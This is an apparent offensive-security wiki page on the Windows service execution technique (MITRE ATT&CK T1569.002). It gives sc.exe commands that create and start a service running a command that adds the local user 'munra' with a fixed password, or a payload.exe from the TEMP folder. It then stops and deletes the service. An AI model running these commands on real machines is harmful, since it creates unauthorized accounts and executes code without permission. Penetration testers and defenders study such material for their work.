---
description: MITRE ATT&CK™   System Services - Service Execution  - Technique T1569.002
---

# Services

## Theory

Windows services can also be leveraged to run arbitrary commands since they execute a command when started.

## Practice

{% tabs %}
{% tab title="sc.exe" %}
On windows, we can use the built in sc.exe binary to remotely interact with services

```bash
#Create a service
sc.exe create MyService binPath= "net user munra Pass123 /add" start= auto
sc.exe create MyService binPath= "C:\Windows\TEMP\payload.exe" start= auto

#Start a service
sc.exe start MyService

#Stop and delete a remote service
sc.exe stop MyService
sc.exe delete MyService
```
{% endtab %}
{% endtabs %}

You may want to check this page for remote services execution :&#x20;

{% content-ref url="../../pivoting/services-svcctl.md" %}
[services-svcctl.md](../../pivoting/services-svcctl.md)
{% endcontent-ref %}
